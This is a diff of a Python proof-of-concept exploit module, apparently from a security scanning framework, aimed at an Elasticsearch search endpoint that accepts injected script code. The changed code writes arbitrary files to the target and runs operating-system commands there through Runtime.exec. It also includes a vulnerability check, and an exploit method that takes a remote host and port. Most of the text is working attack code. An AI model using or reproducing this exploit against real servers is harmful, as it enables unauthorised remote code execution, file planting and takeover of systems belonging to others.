@@ -11,10 +11,11 @@ try:
     import simplejson as json
 except ImportError:
     import json
-
+import socket
 from baseframe import BaseFrame
 from utils.http import ForgeHeaders
 
+socket.setdefaulttimeout(5)
 
 class MyPoc(BaseFrame):
     poc_info = {
@@ -75,47 +76,67 @@ class MyPoc(BaseFrame):
         headers['Accept'] = 'ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         url = args['options']['target'] + '/_search?source'
         req = urllib2.Request(url, data=payload, headers=headers)
-        resp = urllib2.urlopen(req)
-        assert 200 == resp.getcode()
-        ret = json.loads(resp.read())
         try:
-            return ret['hits']['hits'][0]['fields']['task'][0]
-        except:
+            resp = urllib2.urlopen(req)
+        except urllib2.URLError as ex:
+            if args['options']['verbose']:
+                print '[!] {}'.format(ex)
             return None
+        except urllib2.HTTPError as ex:
+            if args['options']['verbose']:
+                print '[!] {}'.format(ex)
+            return None
+
+        if resp.getcode() != 200 or \
+           'application/json' not in resp.headers.get('content-type'):
+            return None
+        else:
+            ret = json.loads(resp.read())
+            ret = ret.get('hits')
+            if ret is None:
+                return None
+            ret = ret.get('hits', [])
+            if len(ret) < 1:
+                return None
+            ret = ret[0].get('fields')
+            if ret is None:
+                return None
+            ret = ret.get('task', [])
+            if len(ret) < 1:
+                return None
+            else:
+                return ret[0]
 
     @classmethod
     def _upload(cls, args, dest, content):
-        try:
-            exp = 'import java.util.*;\nimport java.io.*;\nFile f = new File(\"' + dest + '\");if(f.exists()){\"exists\".toString();}BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"' + content + '\");bw.flush();bw.close();if(f.exists()){\"success\".toString();}'
-            return cls._emit(args, exp)
-        except:
-            return None
+        exp = 'import java.util.*;\nimport java.io.*;\nFile f = new File(\"' + dest + '\");if(f.exists()){\"exists\".toString();}BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"' + content + '\");bw.flush();bw.close();if(f.exists()){\"success\".toString();}'
+        return cls._emit(args, exp)
 
     @classmethod
     def _execute(cls, args, cmd):
-        try:
-            exp = 'import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"'+cmd+'\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"#*!");}sb.toString();'
-            rs = cls._emit(args, exp)
-            return rs.replace('#*!', '\n')
-        except:
+        exp = 'import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"'+cmd+'\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"#*!");}sb.toString();'
+        rs = cls._emit(args, exp)
+        if rs is None:
             return None
+        else:
+            return rs.replace('#*!', '\n')
 
     @classmethod
     def verify(cls, args):
-        try:
-            rs = cls._emit(args, 'Integer.toHexString(65535)')
-            assert rs == 'ffff'
+        rs = cls._emit(args, 'Integer.toHexString(65535)')
+        if rs == 'ffff':
             args['success'] = True
             if args['options']['verbose']:
                 print '[*] {} is vulnerable'.format(args['options']['target'])
-        except:
+        else:
+            if args['options']['verbose']:
+                print '[*] {} is not vulnerable'.format(args['options']['target'])
             args['success'] = False
 
         return args
 
     @classmethod
     def exploit(cls, args):
-        __import__('os').path.exists('/dev/shm/debug') and __import__('pdb').set_trace()
         rhost = args['options']['rhost']
         rport = args['options']['rport']
         if args['options']['verbose']:
@@ -140,4 +161,4 @@ if __name__ == '__main__':
     from pprint import pprint
 
     mp = MyPoc()
-    pprint(mp.run())
+    pprint(mp.run(debug=True))
